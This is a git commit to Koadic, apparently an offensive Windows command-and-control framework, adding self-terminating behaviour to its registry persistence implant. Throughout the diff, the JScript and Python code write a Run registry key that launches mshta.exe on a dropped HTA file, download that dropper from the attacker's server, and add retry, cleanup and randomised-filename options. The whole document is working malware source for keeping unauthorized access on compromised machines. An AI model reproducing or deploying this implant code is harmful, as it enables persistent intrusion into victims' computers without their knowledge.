bed7bf8c6633d8fbe2bf93f5199635a12c415522
TheNaterz <natejcaroe@gmail.com>
2019-06-15 19:32:39 -0600

    self-terminating functionality added, doesn't work with HKLM

--- data/implant/persist/registry.js
+++ data/implant/persist/registry.js
@@ -1,14 +1,14 @@
 try
 {
-
     var headers = {};
     var path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    var droppath = Koadic.file.getPath("~FDROPDIR~\\~FDROPFILE~");
     var key = "K0adic";
 
     if (~CLEANUP~)
     {
         headers["Task"] = "DeleteKey";
-        var hkey = ~HKEY~;
+        var hkey = ~FHKEY~;
         var hkeyname = "";
         switch(hkey)
         {
@@ -23,15 +23,24 @@ try
         }
         var retval = Koadic.shell.exec("reg delete "+hkeyname+"\\"+path+" /v "+key+" /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
         Koadic.work.report(retval, headers);
+        headers["Task"] = "DeleteDropper";
+        Koadic.file.deleteFile(droppath);
+        Koadic.work.report(Koadic.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
     }
     else
     {
-        var comspec = Koadic.shell.exec("echo %comspec%", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
-        comspec = comspec.split(" \r\n")[0];
-        Koadic.registry.write(~HKEY~, path, key, "\""+comspec+"\" /q /c ~CMD~", Koadic.registry.STRING);
+        var dropdir = Koadic.shell.exec("echo ~FDROPDIR~", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
+        dropdir = dropdir.split(" \r\n")[0];
+        Koadic.registry.write(~FHKEY~, path, key, "C:\\Windows\\system32\\mshta.exe "+dropdir+"\\~FDROPFILE~", Koadic.registry.STRING);
         headers["Task"] = "AddKey";
-        var retval = Koadic.registry.read(~HKEY~, path, key, Koadic.registry.STRING).SValue;
+        var retval = Koadic.registry.read(~FHKEY~, path, key, Koadic.registry.STRING).SValue;
         Koadic.work.report(retval, headers);
+
+        headers["X-UploadFileJob"] = "true";
+        Koadic.http.downloadEx("POST", Koadic.work.make_url(), headers, droppath);
+        headers["X-UploadFileJob"] = "false";
+        headers["Task"] = "AddDropper";
+        Koadic.work.report(Koadic.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
     }
 
     Koadic.work.report("Complete");
--- modules/implant/persist/registry.py
+++ modules/implant/persist/registry.py
@@ -8,12 +8,20 @@ class RegistryJob(core.job.Job):
         if self.session_id == -1:
             self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
             return False
-        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
-            self.script = self.script.replace(b"~HKEY~", b"Koadic.registry.HKCU")
-        else:
-            self.script = self.script.replace(b"~HKEY~", b"Koadic.registry.HKLM")
 
     def report(self, handler, data, sanitize = False):
+        task = handler.get_header("Task", False)
+        upload = handler.get_header('X-UploadFileJob', False)
+        if upload == "true":
+            dropper_script = handler.loader.load_script(self.options.get("LDROPFILE"), self.options)
+            template = handler.loader.load_script("data/stager/js/mshta/template.hta")
+            fdata = handler.post_process_script(dropper_script, template, False)
+
+            headers = {}
+            headers['Content-Type'] = 'application/octet-stream'
+            headers['Content-Length'] = len(fdata)
+            handler.reply(200, fdata, headers)
+            return
 
         task = handler.get_header("Task", False)
         data = data.decode()
@@ -22,6 +30,7 @@ class RegistryJob(core.job.Job):
             handler.reply(200)
             if data:
                 self.shell.print_good("K0adic key added to registry.")
+                self.shell.print_command("reg delete "+self.options.get("HKEY")+"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v K0adic /f")
             else:
                 self.shell.print_error("Could not add key to registry.")
             return
@@ -32,7 +41,27 @@ class RegistryJob(core.job.Job):
                 self.shell.print_good("Key was removed.")
             else:
                 self.shell.print_error("Key could not be removed.")
+                self.shell.print_command("reg delete "+self.options.get("HKEY")+"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v K0adic /f")
             return
+
+        if task == "AddDropper":
+            handler.reply(200)
+            if "true" in data.split("~~~")[0]:
+                self.shell.print_good("HTA file dropped at "+data.split("~~~")[1].split()[0])
+                self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
+            else:
+                self.shell.print_error("HTA file could not be dropped. Consider cleaning up and choosing a different DROPDIR.")
+            return
+
+        if task == "DeleteDropper":
+            handler.reply(200)
+            if "false" in data.split("~~~")[0]:
+                self.shell.print_good("HTA file deleted from "+data.split("~~~")[1].split()[0])
+            else:
+                self.shell.print_error("HTA file could not be deleted.")
+                self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
+            return
+
 
         if data == "Complete":
             super(RegistryJob, self).report(handler, data)
@@ -59,6 +88,15 @@ class RegistryImplant(core.implant.Implant):
         self.options.register("CMD", "", "command", hidden=True)
         self.options.register("CLEANUP", "false", "will remove the registry key", enum=["true", "false"])
         self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
+        self.options.register("LDROPFILE", "data/implant/persist/registry.dropper", "local file to drop on the target", advanced=True)
+        self.options.register("DROPDIR", "%APPDATA%", "directory to place the drop file", advanced=True)
+        self.options.register("FDROPDIR", "", "", hidden=True)
+        self.options.register("RETRYATTEMPTS", "5", "number of times to retry calling back before self-terminating (-1 == infinite)")
+        self.options.register("RETRYDELAY", "60", "seconds between retry attempts")
+        self.options.register("DROPFILE", "", "name to give the drop file (randomly generated if no name)", advanced=True)
+        self.options.register("FDROPFILE", "", "", hidden=True)
+        self.options.register("HKEY", "HKCU", "top level registry key to place payload (HKLM does not cleanup with self-termination, use only if you know what you're doing)", enum=["HKCU", "HKLM"], advanced=True)
+        self.options.register("FHKEY", "", "", hidden=True)
 
     def job(self):
         return RegistryJob
@@ -74,6 +112,17 @@ class RegistryImplant(core.implant.Implant):
 
         self.options.set("CMD", payload)
         self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
+        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))
+
+        if self.options.get('DROPFILE'):
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
+        else:
+            import string
+            import random
+            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
+
+        self.options.set("FHKEY", "Koadic.registry."+self.options.get("HKEY"))
 
         payloads = {}
         payloads["js"] = self.loader.load_script("data/implant/persist/registry.js", self.options)
